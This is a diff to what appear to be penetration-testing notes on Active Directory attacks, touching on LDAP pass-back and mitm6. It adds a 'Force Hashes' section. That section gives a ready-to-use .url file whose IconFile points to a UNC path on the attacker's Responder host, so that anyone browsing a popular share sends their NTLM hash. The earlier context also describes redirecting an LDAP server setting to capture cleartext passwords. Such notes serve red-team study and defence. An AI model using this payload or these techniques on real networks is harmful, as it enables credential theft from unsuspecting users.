@@ -35,6 +35,14 @@ This is an LDAP attack (anything that uses LDAP to connect to AD such as printer
 on LDAP server address within the settings configuration if you change the IP address of the LDAP server to your machine and setup a listerner (responder or netcat) the password will be sent over in cleartext
 <br>
 <br>
+<h1> Force Hashes </h1> <br>
+If you already have a user account and can write to a share that has alot of popularity, you can create a file that uses a fake icon file linking back to your IP running responder <br>
+name the file "@something.url" and include contents <br>
+[InternetShortcut]
+URL=https://securify.nl
+IconIndex=0
+IconFile=\\<responder ip>\leak\leak.ico<br>
+  run responder and anyone who visits share will send hash<br>
 
 <h1> MITM6 </h1> <br>
 github.com/got-it/mitm6 <br>
